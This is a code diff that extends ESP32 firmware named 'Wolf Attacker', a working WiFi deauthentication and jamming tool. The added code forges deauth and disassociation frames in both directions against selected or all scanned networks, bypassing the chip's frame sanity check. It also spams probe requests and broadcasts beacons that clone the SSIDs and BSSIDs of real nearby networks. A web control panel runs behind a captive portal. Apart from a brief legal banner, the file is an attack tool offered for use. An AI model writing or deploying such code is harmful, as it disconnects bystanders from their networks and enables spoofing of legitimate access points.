@@ -1,12 +1,30 @@
+/*
+ * Wolf Attacker — ESP32 WiFi Deauther / Jammer (Pro)
+ * AP: Wolf Attacker / Tamil123
+ * Open: http://google.com (captive) or http://192.168.4.1
+ *
+ * Features:
+ *  - Scan / multi-select / attack one / attack all
+ *  - Modes: DEAUTH, DISASSOC, BOTH, BEACON SPAM, PROBE SPAM
+ *  - Intensity, TX power, attack timer (auto-stop)
+ *  - Channel filter, min RSSI filter, select open nets
+ *  - Bidirectional deauth frames, reason code
+ *  - Clone selected SSIDs in beacon spam
+ *  - Live stats, SoftAP client count, free heap, reboot
+ *  - White UI + red buttons, captive portal
+ *  - Optional NRF24 (USE_NRF24 1) + build_opt.h wrap fix
+ *
+ * LEGAL: Use only on networks you own / are authorized to test.
+ */
 
 #include <WiFi.h>
 #include <WebServer.h>
 #include <DNSServer.h>
 #include "esp_wifi.h"
+#include "esp_system.h"
 
 #define USE_NRF24 0
 #define STATUS_LED 2
-#define MAX_TARGETS 32
 #define MAX_SCAN 40
 
 #if USE_NRF24
@@ -20,21 +38,18 @@
 #endif
 
 const char* AP_SSID = "Wolf Attacker";
-// WPA2 SoftAP password must be at least 8 characters ("Tamil" alone is too short)
-const char* AP_PASS = "Tamil123";
+const char* AP_PASS = "Tamil123";  // WPA2 needs 8+ chars
 
 DNSServer dnsServer;
 WebServer server(80);
 const byte DNS_PORT = 53;
 
-// ESP32 core 3.x already defines ieee80211_raw_frame_sanity_check (strong symbol).
-// Do NOT redefine it — use linker --wrap (see build_opt.h) instead.
-extern "C" int __wrap_ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
-  (void)arg; (void)arg2; (void)arg3;
-  return 0;  // allow raw deauth / management frames
+// ESP32 Arduino 3.x: use --wrap (see build_opt.h). Do NOT redefine the real symbol.
+extern "C" int __wrap_ieee80211_raw_frame_sanity_check(int32_t a, int32_t b, int32_t c) {
+  (void)a; (void)b; (void)c;
+  return 0;
 }
 
-// --- Frame templates ---
 uint8_t deauthFrame[26] = {
   0xC0, 0x00, 0x00, 0x00,
   0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
@@ -51,13 +66,15 @@ uint8_t disassocFrame[26] = {
   0x00, 0x00, 0x01, 0x00
 };
 
+uint8_t deauthRevFrame[26];   // STA -> AP style (swapped)
+uint8_t probeFrame[68];
 uint8_t beaconFrame[128];
 
-// No custom enum type — Arduino IDE inserts prototypes before enums and breaks compile
 #define MODE_DEAUTH    0
 #define MODE_DISASSOC  1
 #define MODE_BOTH      2
 #define MODE_BEACON    3
+#define MODE_PROBE     4
 
 struct NetInfo {
   String  ssid;
@@ -66,7 +83,7 @@ struct NetInfo {
   uint8_t channel;
   int32_t rssi;
   int     enc;
-  bool selected;
+  bool    selected;
 };
 
 NetInfo nets[MAX_SCAN];
@@ -75,6 +92,14 @@ int scannedCount = 0;
 bool attacking = false;
 int attackMode = MODE_BOTH;
 int intensity = 8;
+int txPower = 84;           // 8..84 (esp_wifi units ~0.25 dBm)
+int attackTimerSec = 0;     // 0 = forever
+int channelFilter = 0;      // 0 = all channels
+int minRssi = -95;          // hide weaker than this in list actions
+int reasonCode = 7;
+bool biDirectional = true;
+bool cloneBeacons = true;
+
 unsigned long packetsSent = 0;
 unsigned long attackStartMs = 0;
 unsigned long lastPktMs = 0;
@@ -82,8 +107,8 @@ unsigned long pktsLastSec = 0;
 unsigned long pktsWindow = 0;
 int currentAttackCh = 1;
 String attackLabel = "";
+unsigned long lastScanMs = 0;
 
-// Use int/uint8_t in signatures — Arduino auto-prototypes break on custom enums.
 const char * encName(int m) {
   switch (m) {
     case WIFI_AUTH_OPEN:            return "OPEN";
@@ -108,11 +133,24 @@ const char * getModeName(int m) {
     case MODE_DISASSOC: return "DISASSOC";
     case MODE_BOTH:     return "DEAUTH+DISASSOC";
     case MODE_BEACON:   return "BEACON SPAM";
+    case MODE_PROBE:    return "PROBE SPAM";
     default:            return "?";
   }
 }
 
+bool passesFilter(int i) {
+  if (i < 0 || i >= scannedCount) return false;
+  if (channelFilter > 0 && nets[i].channel != channelFilter) return false;
+  if (nets[i].rssi < minRssi) return false;
+  return true;
+}
+
 void setLed(bool on) { digitalWrite(STATUS_LED, on ? HIGH : LOW); }
+
+void applyTxPower() {
+  int p = constrain(txPower, 8, 84);
+  esp_wifi_set_max_tx_power(p);
+}
 
 void doScan() {
   attacking = false;
@@ -139,36 +177,62 @@ void doScan() {
       }
     }
   }
+  lastScanMs = millis();
 }
 
 int selectedCount() {
   int c = 0;
-  for (int i = 0; i < scannedCount; i++) if (nets[i].selected) c++;
+  for (int i = 0; i < scannedCount; i++) {
+    if (nets[i].selected && passesFilter(i)) c++;
+  }
   return c;
 }
 
-void fillApAddrs(uint8_t* frame, const uint8_t* bssid) {
-  memcpy(&frame[10], bssid, 6);
-  memcpy(&frame[16], bssid, 6);
+void setReasonOnFrames() {
+  uint8_t lo = (uint8_t)(reasonCode & 0xFF);
+  uint8_t hi = (uint8_t)((reasonCode >> 8) & 0xFF);
+  deauthFrame[24] = lo; deauthFrame[25] = hi;
+  disassocFrame[24] = lo; disassocFrame[25] = hi;
+  deauthRevFrame[24] = lo; deauthRevFrame[25] = hi;
+}
+
+void fillApToSta(uint8_t* frame, const uint8_t* bssid) {
+  memset(&frame[4], 0xFF, 6);          // dest broadcast
+  memcpy(&frame[10], bssid, 6);        // src = AP
+  memcpy(&frame[16], bssid, 6);        // BSSID = AP
+}
+
+void fillStaToAp(uint8_t* frame, const uint8_t* bssid) {
+  memcpy(&frame[4], bssid, 6);         // dest = AP
+  memset(&frame[10], 0xFF, 6);         // src broadcast-ish
+  memcpy(&frame[16], bssid, 6);        // BSSID = AP
+  frame[10] = 0x01; frame[11] = 0x02; frame[12] = 0x03;
+  frame[13] = 0x04; frame[14] = 0x05; frame[15] = 0x06;
 }
 
 void sendMgmtBurst(const uint8_t* bssid, uint8_t ch) {
-  fillApAddrs(deauthFrame, bssid);
-  fillApAddrs(disassocFrame, bssid);
+  setReasonOnFrames();
+  memcpy(deauthRevFrame, deauthFrame, 26);
+  fillApToSta(deauthFrame, bssid);
+  fillApToSta(disassocFrame, bssid);
+  fillStaToAp(deauthRevFrame, bssid);
+
   esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
   currentAttackCh = ch;
 
   int bursts = constrain(intensity, 1, 32);
   for (int i = 0; i < bursts; i++) {
     if (attackMode == MODE_DEAUTH || attackMode == MODE_BOTH) {
-      esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, sizeof(deauthFrame), false);
-      packetsSent++;
-      pktsWindow++;
+      esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, 26, false);
+      packetsSent++; pktsWindow++;
+      if (biDirectional) {
+        esp_wifi_80211_tx(WIFI_IF_AP, deauthRevFrame, 26, false);
+        packetsSent++; pktsWindow++;
+      }
     }
     if (attackMode == MODE_DISASSOC || attackMode == MODE_BOTH) {
-      esp_wifi_80211_tx(WIFI_IF_AP, disassocFrame, sizeof(disassocFrame), false);
-      packetsSent++;
-      pktsWindow++;
+      esp_wifi_80211_tx(WIFI_IF_AP, disassocFrame, 26, false);
+      packetsSent++; pktsWindow++;
     }
   }
 }
@@ -176,14 +240,11 @@ void sendMgmtBurst(const uint8_t* bssid, uint8_t ch) {
 void buildBeacon(const String& ssid, const uint8_t* bssid, uint8_t ch) {
   memset(beaconFrame, 0, sizeof(beaconFrame));
   beaconFrame[0] = 0x80;
-  beaconFrame[1] = 0x00;
   memset(&beaconFrame[4], 0xFF, 6);
   memcpy(&beaconFrame[10], bssid, 6);
   memcpy(&beaconFrame[16], bssid, 6);
-  beaconFrame[32] = 0x64;
-  beaconFrame[33] = 0x00;
-  beaconFrame[34] = 0x01;
-  beaconFrame[35] = 0x04;
+  beaconFrame[32] = 0x64; beaconFrame[33] = 0x00;
+  beaconFrame[34] = 0x01; beaconFrame[35] = 0x04;
   int pos = 36;
   beaconFrame[pos++] = 0x00;
   uint8_t len = (uint8_t)min((int)ssid.length(), 32);
@@ -207,11 +268,29 @@ void sendBeaconSpam() {
   };
   static int nameIdx = 0;
 
+  fakeMac[4] = (uint8_t)(millis() & 0xFF);
   fakeMac[5]++;
-  if (fakeMac[5] == 0) fakeMac[4]++;
 
+  String name;
   uint8_t ch = 1 + (nameIdx % 13);
-  String name = fakeNames[nameIdx % 12];
+
+  if (cloneBeacons && selectedCount() > 0) {
+    // rotate through selected SSIDs
+    int seen = 0;
+    int pick = nameIdx % selectedCount();
+    for (int i = 0; i < scannedCount; i++) {
+      if (!nets[i].selected || !passesFilter(i)) continue;
+      if (seen == pick) {
+        name = nets[i].ssid.length() ? nets[i].ssid : String("Hidden_") + String(i);
+        ch = nets[i].channel;
+        memcpy(fakeMac, nets[i].bssid, 6);
+        fakeMac[5] ^= (uint8_t)nameIdx; // slightly different MAC
+        break;
+      }
+      seen++;
+    }
+  }
+  if (name.length() == 0) name = fakeNames[nameIdx % 12];
   nameIdx++;
 
   buildBeacon(name, fakeMac, ch);
@@ -222,15 +301,55 @@ void sendBeaconSpam() {
   int bursts = constrain(intensity, 1, 32);
   for (int i = 0; i < bursts; i++) {
     esp_wifi_80211_tx(WIFI_IF_AP, beaconFrame, flen, false);
-    packetsSent++;
-    pktsWindow++;
+    packetsSent++; pktsWindow++;
+  }
+}
+
+void sendProbeSpam() {
+  static uint8_t src[6] = {0xAA, 0xBB, 0xCC, 0x00, 0x00, 0x01};
+  src[5]++;
+  memset(probeFrame, 0, sizeof(probeFrame));
+  probeFrame[0] = 0x40; // probe request
+  memset(&probeFrame[4], 0xFF, 6);
+  memcpy(&probeFrame[10], src, 6);
+  memset(&probeFrame[16], 0xFF, 6);
+  int pos = 24;
+  probeFrame[pos++] = 0x00; // SSID wildcard
+  probeFrame[pos++] = 0x00;
+  probeFrame[pos++] = 0x01; probeFrame[pos++] = 0x04;
+  probeFrame[pos++] = 0x82; probeFrame[pos++] = 0x84;
+  probeFrame[pos++] = 0x8b; probeFrame[pos++] = 0x96;
+
+  uint8_t ch = (channelFilter > 0) ? channelFilter : (1 + (src[5] % 13));
+  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
+  currentAttackCh = ch;
+
+  int bursts = constrain(intensity, 1, 32);
+  for (int i = 0; i < bursts; i++) {
+    esp_wifi_80211_tx(WIFI_IF_AP, probeFrame, pos, false);
+    packetsSent++; pktsWindow++;
   }
 }
 
 void runAttackTick() {
+  if (attackTimerSec > 0) {
+    unsigned long elapsed = (millis() - attackStartMs) / 1000UL;
+    if (elapsed >= (unsigned long)attackTimerSec) {
+      attacking = false;
+      setLed(false);
+      attackLabel = "TIMER STOPPED";
+      return;
+    }
+  }
+
   if (attackMode == MODE_BEACON) {
     sendBeaconSpam();
-    attackLabel = "BEACON SPAM";
+    attackLabel = cloneBeacons ? "BEACON (clone)" : "BEACON SPAM";
+    return;
+  }
+  if (attackMode == MODE_PROBE) {
+    sendProbeSpam();
+    attackLabel = "PROBE SPAM";
     return;
   }
 
@@ -243,7 +362,7 @@ void runAttackTick() {
 
   attackLabel = String(sel) + " target(s)";
   for (int i = 0; i < scannedCount; i++) {
-    if (!nets[i].selected) continue;
+    if (!nets[i].selected || !passesFilter(i)) continue;
     sendMgmtBurst(nets[i].bssid, nets[i].channel);
   }
 }
@@ -274,10 +393,10 @@ String htmlEscape(const String& s) {
   String o;
   for (unsigned i = 0; i < s.length(); i++) {
     char c = s.charAt(i);
-    if (c == '<') o += "&lt;";
-    else if (c == '>') o += "&gt;";
-    else if (c == '&') o += "&amp;";
-    else if (c == '"') o += "&quot;";
+    if (c == '<') o += F("&lt;");
+    else if (c == '>') o += F("&gt;");
+    else if (c == '&') o += F("&amp;");
+    else if (c == '"') o += F("&quot;");
     else o += c;
   }
   return o;
@@ -286,15 +405,17 @@ String htmlEscape(const String& s) {
 String htmlPage() {
   unsigned long uptime = millis() / 1000;
   unsigned long atkSec = attacking ? (millis() - attackStartMs) / 1000 : 0;
+  int clients = WiFi.softAPgetStationNum();
+  uint32_t heap = ESP.getFreeHeap();
 
   String p;
-  p.reserve(12000);
+  p.reserve(14000);
   p += F("<!DOCTYPE html><html><head><meta charset='utf-8'>");
   p += F("<meta name='viewport' content='width=device-width,initial-scale=1'>");
-  p += F("<title>ESP32 Deauther Pro</title><style>");
+  p += F("<title>Wolf Attacker</title><style>");
   p += F("*{box-sizing:border-box}");
   p += F("body{background:#fff;color:#111;font-family:Arial,Helvetica,sans-serif;margin:0;padding:14px}");
-  p += F("h1{color:#c62828;text-align:center;margin:4px 0;font-size:26px}");
+  p += F("h1{color:#c62828;text-align:center;margin:4px 0;font-size:28px;letter-spacing:1px}");
   p += F(".sub{text-align:center;color:#666;font-size:13px;margin-bottom:10px}");
   p += F(".warn{background:#fff3e0;color:#e65100;border:1px solid #ffcc80;padding:8px;border-radius:6px;font-size:12px;text-align:center;margin-bottom:10px}");
   p += F(".card{background:#fafafa;border:1px solid #eee;border-radius:8px;padding:12px;margin:10px 0}");
@@ -313,13 +434,14 @@ String htmlPage() {
   p += F("th,td{border:1px solid #ddd;padding:7px;text-align:left}");
   p += F("th{background:#f5f5f5;color:#c62828}");
   p += F("tr.sel{background:#ffebee}");
+  p += F("tr.dim{opacity:.45}");
   p += F("label{font-size:13px;margin-right:8px}");
-  p += F("select,input[type=number]{padding:6px;border:1px solid #ccc;border-radius:5px;margin:2px}");
+  p += F("select,input[type=number]{padding:6px;border:1px solid #ccc;border-radius:5px;margin:2px;max-width:110px}");
   p += F(".row{display:flex;flex-wrap:wrap;gap:8px;align-items:center;justify-content:center}");
   p += F("</style></head><body>");
 
-  p += F("<h1>ESP32 Deauther Pro</h1>");
-  p += F("<div class='sub'>Scan &middot; Multi-target &middot; Deauth / Disassoc / Beacon &middot; Jam</div>");
+  p += F("<h1>Wolf Attacker</h1>");
+  p += F("<div class='sub'>WiFi scan &middot; target select &middot; deauth / jam / beacon / probe</div>");
   p += F("<div class='warn'>Authorized testing only. Attacking networks you do not own is illegal.</div>");
 
   p += F("<div class='card'>");
@@ -338,7 +460,10 @@ String htmlPage() {
   p += "<div class='chip'>Channel <b>" + String(currentAttackCh) + "</b></div>";
   p += "<div class='chip'>Selected <b>" + String(selectedCount()) + "</b></div>";
   p += "<div class='chip'>Scanned <b>" + String(scannedCount) + "</b></div>";
-  p += "<div class='chip'>Attack time <b>" + String(atkSec) + "s</b></div>";
+  p += "<div class='chip'>Attack <b>" + String(atkSec) + "s</b></div>";
+  p += "<div class='chip'>Timer <b>" + (attackTimerSec ? String(attackTimerSec) + "s" : String("OFF")) + "</b></div>";
+  p += "<div class='chip'>AP clients <b>" + String(clients) + "</b></div>";
+  p += "<div class='chip'>Heap <b>" + String(heap) + "</b></div>";
   p += "<div class='chip'>Uptime <b>" + String(uptime) + "s</b></div>";
 #if USE_NRF24
   p += "<div class='chip'>NRF24 <b>";
@@ -347,26 +472,44 @@ String htmlPage() {
 #endif
   p += F("</div></div>");
 
+  // Settings
   p += F("<div class='card'><form method='GET' action='/settings'><div class='row'>");
   p += F("<label>Mode <select name='mode'>");
   p += String("<option value='0'") + (attackMode == MODE_DEAUTH ? " selected" : "") + ">DEAUTH</option>";
   p += String("<option value='1'") + (attackMode == MODE_DISASSOC ? " selected" : "") + ">DISASSOC</option>";
   p += String("<option value='2'") + (attackMode == MODE_BOTH ? " selected" : "") + ">BOTH</option>";
   p += String("<option value='3'") + (attackMode == MODE_BEACON ? " selected" : "") + ">BEACON SPAM</option>";
+  p += String("<option value='4'") + (attackMode == MODE_PROBE ? " selected" : "") + ">PROBE SPAM</option>";
   p += F("</select></label>");
-  p += F("<label>Intensity <input type='number' name='int' min='1' max='32' value='");
-  p += String(intensity);
-  p += F("'></label>");
+  p += F("<label>Intensity <input type='number' name='int' min='1' max='32' value='") + String(intensity) + F("'></label>");
+  p += F("<label>TX power <input type='number' name='tx' min='8' max='84' value='") + String(txPower) + F("'></label>");
+  p += F("<label>Timer(s) <input type='number' name='timer' min='0' max='3600' value='") + String(attackTimerSec) + F("'></label>");
+  p += F("<label>Ch filter <input type='number' name='ch' min='0' max='13' value='") + String(channelFilter) + F("'></label>");
+  p += F("<label>Min RSSI <input type='number' name='rssi' min='-100' max='0' value='") + String(minRssi) + F("'></label>");
+  p += F("<label>Reason <input type='number' name='reason' min='1' max='24' value='") + String(reasonCode) + F("'></label>");
+  p += F("<label>Bidir <select name='bidir'><option value='1'");
+  p += biDirectional ? " selected" : "";
+  p += F(">ON</option><option value='0'");
+  p += !biDirectional ? " selected" : "";
+  p += F(">OFF</option></select></label>");
+  p += F("<label>Clone SSID <select name='clone'><option value='1'");
+  p += cloneBeacons ? " selected" : "";
+  p += F(">ON</option><option value='0'");
+  p += !cloneBeacons ? " selected" : "";
+  p += F(">OFF</option></select></label>");
   p += F("<button class='btn' type='submit'>APPLY</button>");
   p += F("</div></form></div>");
 
+  // Controls
   p += F("<div class='bar'>");
   p += F("<a href='/scan'><button class='btn'>SCAN WIFI</button></a>");
   p += F("<a href='/selectall'><button class='btn dark'>SELECT ALL</button></a>");
+  p += F("<a href='/selectopen'><button class='btn dark'>SELECT OPEN</button></a>");
   p += F("<a href='/clear'><button class='btn grey'>CLEAR</button></a>");
   p += F("<a href='/attack'><button class='btn'>JAM / DEAUTH</button></a>");
   p += F("<a href='/attackall'><button class='btn'>ATTACK ALL</button></a>");
   p += F("<a href='/stop'><button class='btn grey'>STOP</button></a>");
+  p += F("<a href='/reboot'><button class='btn grey'>REBOOT</button></a>");
 #if USE_NRF24
   p += F("<a href='/nrf'><button class='btn'>");
   p += nrfJamming ? "NRF STOP" : "NRF JAM";
@@ -374,10 +517,14 @@ String htmlPage() {
 #endif
   p += F("</div>");
 
+  // Table
   p += F("<div class='card' style='padding:0;overflow-x:auto'>");
   p += F("<table><tr><th>Sel</th><th>#</th><th>SSID</th><th>Ch</th><th>RSSI</th><th>Enc</th><th>BSSID</th><th>Action</th></tr>");
   for (int i = 0; i < scannedCount; i++) {
-    p += nets[i].selected ? F("<tr class='sel'>") : F("<tr>");
+    bool ok = passesFilter(i);
+    if (nets[i].selected && ok) p += F("<tr class='sel'>");
+    else if (!ok) p += F("<tr class='dim'>");
+    else p += F("<tr>");
     p += "<td><a href='/toggle?id=" + String(i) + "'>" + (nets[i].selected ? "[X]" : "[ ]") + "</a></td>";
     p += "<td>" + String(i) + "</td>";
     String ssid = nets[i].ssid.length() ? htmlEscape(nets[i].ssid) : "<i>(hidden)</i>";
@@ -394,7 +541,7 @@ String htmlPage() {
   if (scannedCount == 0)
     p += F("<p style='text-align:center;color:#888'>No networks yet. Press <b>SCAN WIFI</b>.</p>");
 
-  p += F("<p class='sub'>Auto-refresh every 2s while attacking. Sorted by strongest signal.</p>");
+  p += F("<p class='sub'>Ch filter 0 = all &middot; Timer 0 = forever &middot; Dim rows = filtered out</p>");
   if (attacking) p += F("<script>setTimeout(()=>location='/',2000);</script>");
   p += F("</body></html>");
   return p;
@@ -427,11 +574,19 @@ void handleStop() {
 void handleSettings() {
   if (server.hasArg("mode")) {
     int m = server.arg("mode").toInt();
-    if (m >= 0 && m <= 3) attackMode = m;
+    if (m >= 0 && m <= 4) attackMode = m;
   }
-  if (server.hasArg("int")) {
-    intensity = constrain(server.arg("int").toInt(), 1, 32);
+  if (server.hasArg("int")) intensity = constrain(server.arg("int").toInt(), 1, 32);
+  if (server.hasArg("tx")) {
+    txPower = constrain(server.arg("tx").toInt(), 8, 84);
+    applyTxPower();
   }
+  if (server.hasArg("timer")) attackTimerSec = constrain(server.arg("timer").toInt(), 0, 3600);
+  if (server.hasArg("ch")) channelFilter = constrain(server.arg("ch").toInt(), 0, 13);
+  if (server.hasArg("rssi")) minRssi = constrain(server.arg("rssi").toInt(), -100, 0);
+  if (server.hasArg("reason")) reasonCode = constrain(server.arg("reason").toInt(), 1, 24);
+  if (server.hasArg("bidir")) biDirectional = server.arg("bidir").toInt() != 0;
+  if (server.hasArg("clone")) cloneBeacons = server.arg("clone").toInt() != 0;
   redirectHome();
 }
 
@@ -444,7 +599,16 @@ void handleToggle() {
 }
 
 void handleSelectAll() {
-  for (int i = 0; i < scannedCount; i++) nets[i].selected = true;
+  for (int i = 0; i < scannedCount; i++) {
+    nets[i].selected = passesFilter(i);
+  }
+  redirectHome();
+}
+
+void handleSelectOpen() {
+  for (int i = 0; i < scannedCount; i++) {
+    nets[i].selected = passesFilter(i) && (nets[i].enc == WIFI_AUTH_OPEN);
+  }
   redirectHome();
 }
 
@@ -461,16 +625,17 @@ void startAttack() {
   attackStartMs = millis();
   attacking = true;
   setLed(true);
+  applyTxPower();
 }
 
 void handleAttack() {
-  if (attackMode == MODE_BEACON || selectedCount() > 0) startAttack();
+  if (attackMode == MODE_BEACON || attackMode == MODE_PROBE || selectedCount() > 0) startAttack();
   redirectHome();
 }
 
 void handleAttackAll() {
-  for (int i = 0; i < scannedCount; i++) nets[i].selected = true;
-  if (scannedCount > 0 || attackMode == MODE_BEACON) startAttack();
+  for (int i = 0; i < scannedCount; i++) nets[i].selected = passesFilter(i);
+  if (scannedCount > 0 || attackMode == MODE_BEACON || attackMode == MODE_PROBE) startAttack();
   redirectHome();
 }
 
@@ -484,6 +649,12 @@ void handleAttackOne() {
     }
   }
   redirectHome();
+}
+
+void handleReboot() {
+  server.send(200, "text/plain", "Rebooting...");
+  delay(300);
+  ESP.restart();
 }
 
 #if USE_NRF24
@@ -501,7 +672,7 @@ void setup() {
   pinMode(STATUS_LED, OUTPUT);
   setLed(false);
   delay(200);
-  Serial.println("\n[ESP32 Deauther Pro] booting...");
+  Serial.println("\n[Wolf Attacker] booting...");
 
   WiFi.mode(WIFI_AP_STA);
   WiFi.softAP(AP_SSID, AP_PASS);
@@ -509,10 +680,8 @@ void setup() {
   Serial.print("AP IP: ");
   Serial.println(apIP);
 
-  // Captive portal: any domain (e.g. google.com) resolves to this ESP32
   dnsServer.start(DNS_PORT, "*", apIP);
-
-  esp_wifi_set_max_tx_power(84);
+  applyTxPower();
 
   server.on("/", handleRoot);
   server.on("/scan", handleScan);
@@ -520,14 +689,15 @@ void setup() {
   server.on("/settings", handleSettings);
   server.on("/toggle", handleToggle);
   server.on("/selectall", handleSelectAll);
+  server.on("/selectopen", handleSelectOpen);
   server.on("/clear", handleClear);
   server.on("/attack", handleAttack);
   server.on("/attackall", handleAttackAll);
   server.on("/attackone", handleAttackOne);
+  server.on("/reboot", handleReboot);
 #if USE_NRF24
   server.on("/nrf", handleNrf);
 #endif
-  // Serve UI for any URL/host (http://google.com, captive checks, etc.)
   server.onNotFound(handleRoot);
   server.begin();
   Serial.println("Web UI -> http://google.com  (or http://192.168.4.1)");
